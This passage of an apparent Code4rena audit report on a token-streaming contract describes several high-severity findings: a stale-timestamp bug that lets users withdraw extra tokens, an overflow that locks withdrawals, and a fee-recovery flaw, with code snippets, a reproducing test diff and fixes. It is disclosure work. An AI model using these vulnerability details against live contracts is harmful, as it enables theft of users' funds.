!= 0 as well as emergency gov needs to be set to 0 before abdication because it won’t be able to abdicate itself.</p>\n<p>Would consider it to be medium risk because chances of it ever being called are slim as it literally would cutoff the protocol from being able to capture its fees.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/132#issuecomment-1013518527\">0xean (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Given that the functionality and vulnerability exists, and the governor does claim fees, this could lead to the loss of funds. Based on the documentation for C4, that would qualify as high severity. </p>\n<p><code>3 — High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).</code></p>\n</blockquote>\n<h2 id=\"h-08-tstokens-sometimes-calculated-incorrectly\" style=\"position:relative;\"><a href=\"#h-08-tstokens-sometimes-calculated-incorrectly\" aria-label=\"h 08 tstokens sometimes calculated incorrectly permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/123\">[H-08] ts.tokens sometimes calculated incorrectly</a></h2>\n<p><em>Submitted by gpersoon, also found by WatchPug</em></p>\n<h4 id=\"impact-5\" style=\"position:relative;\"><a href=\"#impact-5\" aria-label=\"impact 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h4>\n<p>Suppose someone stakes some tokens and then withdraws all of his tokens (he can still withdraw). This will result in ts.tokens being 0.</p>\n<p>Now after some time he stakes some tokens again.\nAt the second stake <code>updateStream()</code> is called and the following if condition is false because <code>ts.tokens==0</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">acctTimeDelta</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">ts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokens</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span></code></pre>\n<p>Thus <code>ts.lastUpdate</code> is not updated and stays at the value from the first withdraw.\nNow he does a second withdraw. <code>updateStream()</code> is called an calculates the updated value of <code>ts.tokens</code>.\nHowever it uses <code>ts.lastUpdate</code>, which is the time from the first withdraw and not from the second stake. So the value of <code>ts.token</code> is calculated incorrectly.\nThus more tokens can be withdrawn than you are supposed to be able to withdraw.</p>\n<h4 id=\"proof-of-concept-7\" style=\"position:relative;\"><a href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h4>\n<p><a href=\"https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L417-L447\">https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L417-L447</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">stake</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint112</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">lock</span><span class=\"mtk1\"> </span><span class=\"mtk11\">updateStream</span><span class=\"mtk1\">(msg.sender) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...         </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint112</span><span class=\"mtk1\"> </span><span class=\"mtk12\">trueDepositAmt</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint112</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newBal</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">prevBal</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ... </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokens</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">trueDepositAmt</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L455-L479\">https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L455-L479</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint112</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">lock</span><span class=\"mtk1\"> </span><span class=\"mtk11\">updateStream</span><span class=\"mtk1\">(msg.sender) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokens</span><span class=\"mtk1\"> -= </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L203-L250\">https://github.com/code-423n4/2021-11-streaming/blob/56d81204a00fc949d29ddd277169690318b36821/Streaming/src/Locke.sol#L203-L250</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">updateStreamInternal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">who</span><span class=\"mtk1\">) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">acctTimeDelta</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint32</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">) - </span><span class=\"mtk12\">ts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lastUpdate</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">acctTimeDelta</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">ts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokens</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// some time has passed since this user last interacted</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// update ts not yet streamed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokens</span><span class=\"mtk1\"> -= </span><span class=\"mtk11\">uint112</span><span class=\"mtk1\">(</span><span class=\"mtk12\">acctTimeDelta</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">ts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokens</span><span class=\"mtk1\"> / (</span><span class=\"mtk12\">endStream</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">ts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lastUpdate</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lastUpdate</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint32</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h4 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h4>\n<p>Change the code in updateStream()  to:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"js\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">acctTimeDelta</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// some time has passed since this user last interacted</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// update ts not yet streamed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">ts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokens</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">ts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokens</span><span class=\"mtk1\"> -= </span><span class=\"mtk11\">uint112</span><span class=\"mtk1\">(</span><span class=\"mtk12\">acctTimeDelta</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">ts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokens</span><span class=\"mtk1\"> / (</span><span class=\"mtk12\">endStream</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">ts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lastUpdate</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ts</span><span class=\"mtk1\">.</span><span class=\"mtk12\">lastUpdate</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint32</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);  </span><span class=\"mtk3\">// always update ts.lastUpdate (if time has elapsed)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Note: the next if statement with unstreamed and lastUpdate can be changed in a similar way to save some gas</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/123#issuecomment-986945392\">brockelmore (Streaming Protocol) confirmed</a>:</strong></p>\n<blockquote>\n<p>Nice catch :)</p>\n</blockquote>\n<h2 id=\"h-09-dos-while-dealing-with-erc20-when-valueie-amountdecimals--is-high-but-less-than-typeuint112max\" style=\"position:relative;\"><a href=\"#h-09-dos-while-dealing-with-erc20-when-valueie-amountdecimals--is-high-but-less-than-typeuint112max\" aria-label=\"h 09 dos while dealing with erc20 when valueie amountdecimals  is high but less than typeuint112max permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/228\">[H-09] DOS while dealing with erc20 when value(i.e amount*decimals)  is high but less than type(uint112).max</a></h2>\n<p><em>Submitted by hack3r-0m</em></p>\n<h4 id=\"impact-6\" style=\"position:relative;\"><a href=\"#impact-6\" aria-label=\"impact 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h4>\n<p><a href=\"https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L229\">https://github.com/code-423n4/2021-11-streaming/blob/main/Streaming/src/Locke.sol#L229</a></p>\n<p>reverts due to overflow for higher values (but strictly less than type(uint112).max) and hence when user calls <code>exit</code> or <code>withdraw</code> function it will revert and that user will not able to withdraw funds permanentaly.</p>\n<h4 id=\"proof-of-concept-8\" style=\"position:relative;\"><a href=\"#proof-of-concept-8\" aria-label=\"proof of concept 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h4>\n<p>Attaching diff to modify tests to reproduce behaviour:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">diff --git a/Streaming/src/test/Locke.t.sol b/Streaming/src/test/Locke.t.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">index 2be8db0..aba19ce 100644</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">--- a/Streaming/src/test/Locke.t.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+++ b/Streaming/src/test/Locke.t.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">@@ -166,14 +166,14 @@ contract StreamTest is LockeTest {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         testTokenA.approve(address(stream), type(uint256).max);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">-        stream.fundStream((10**14)*10**18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        stream.fundStream(1000);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">-        alice.doStake(stream, address(testTokenB), (10**13)*10**18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        alice.doStake(stream, address(testTokenB), 100);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         hevm.warp(startTime + minStreamDuration / 2); // move to half done</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">-        bob.doStake(stream, address(testTokenB), (10**13)*10**18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        bob.doStake(stream, address(testTokenB), 100);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         hevm.warp(startTime + minStreamDuration / 2 + minStreamDuration / 10);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">@@ -182,10 +182,10 @@ contract StreamTest is LockeTest {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         hevm.warp(startTime + minStreamDuration + 1); // warp to end of stream</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">-        // alice.doClaimReward(stream);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">-        // assertEq(testTokenA.balanceOf(address(alice)), 533*(10**15));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">-        // bob.doClaimReward(stream);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">-        // assertEq(testTokenA.balanceOf(address(bob)), 466*(10**15));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        alice.doClaimReward(stream);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        assertEq(testTokenA.balanceOf(address(alice)), 533);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        bob.doClaimReward(stream);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        assertEq(testTokenA.balanceOf(address(bob)), 466);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">     }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">     function test_stake() public {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">diff --git a/Streaming/src/test/utils/LockeTest.sol b/Streaming/src/test/utils/LockeTest.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">index eb38060..a479875 100644</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">--- a/Streaming/src/test/utils/LockeTest.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+++ b/Streaming/src/test/utils/LockeTest.sol</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">@@ -90,11 +90,11 @@ abstract contract LockeTest is TestHelpers {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         testTokenA = ERC20(address(new TestToken(&quot;Test Token A&quot;, &quot;TTA&quot;, 18)));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         testTokenB = ERC20(address(new TestToken(&quot;Test Token B&quot;, &quot;TTB&quot;, 18)));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         testTokenC = ERC20(address(new TestToken(&quot;Test Token C&quot;, &quot;TTC&quot;, 18)));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">-        write_balanceOf_ts(address(testTokenA), address(this), (10**14)*10**18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">-        write_balanceOf_ts(address(testTokenB), address(this), (10**14)*10**18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">-        write_balanceOf_ts(address(testTokenC), address(this), (10**14)*10**18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">-        assertEq(testTokenA.balanceOf(address(this)), (10**14)*10**18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">-        assertEq(testTokenB.balanceOf(address(this)), (10**14)*10**18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        write_balanceOf_ts(address(testTokenA), address(this), 100*10**18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        write_balanceOf_ts(address(testTokenB), address(this), 100*10**18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        write_balanceOf_ts(address(testTokenC), address(this), 100*10**18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        assertEq(testTokenA.balanceOf(address(this)), 100*10**18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">+        assertEq(testTokenB.balanceOf(address(this)), 100*10**18);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">         defaultStreamFactory = new StreamFactory(address(this), address(this));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> </span></span></code></pre>\n<h4 id=\"tools-used-2\" style=\"position:relative;\"><a href=\"#tools-used-2\" aria-label=\"tools used 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h4>\n<p>Manual Review</p>\n<h4 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h4>\n<p>Consider doing arithmetic operations in two steps or upcasting to u256 and then downcasting. Alternatively, find a threshold where it breaks and add require condition to not allow total stake per user greater than threshhold.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/228\">brockelmore (Streaming Protocol) confirmed</a></strong> </p>\n<h2 id=\"h-10-recovertokens-doesnt-work-when-issale-is-true\" style=\"position:relative;\"><a href=\"#h-10-recovertokens-doesnt-work-when-issale-is-true\" aria-label=\"h 10 recovertokens doesnt work when issale is true permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-11-streaming-findings/issues/121\">[H-10] recoverTokens doesn’t work when isSale is true</a></h2>\n<p><em>Submitted by harleythedog, also found by kenzo, pedroais, hyh, and pauliax</em></p>\n<h4 id=\"impact-7\" style=\"position:relative;\"><a href=\"#impact-7\" aria-label=\"impact 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 